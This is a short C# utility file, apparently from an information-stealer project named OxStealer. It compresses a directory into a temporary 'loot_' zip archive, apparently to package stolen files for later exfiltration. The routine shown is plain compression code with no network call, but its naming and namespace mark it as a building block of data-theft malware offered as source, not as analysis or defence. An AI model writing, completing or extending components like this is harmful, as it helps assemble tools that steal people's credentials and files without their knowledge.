// Utils/Zip.cs
using System;
using System.IO;
using System.IO.Compression;

namespace OxStealer.Utils
{
    internal static class Zip
    {
        public static string PackDir(string dir)
        {
            var zipPath = Path.Combine(Path.GetTempPath(), "loot_" + Guid.NewGuid().ToString("N") + ".zip");
            ZipFile.CreateFromDirectory(dir, zipPath, CompressionLevel.Fastest, false);
            return zipPath;
        }
    }
}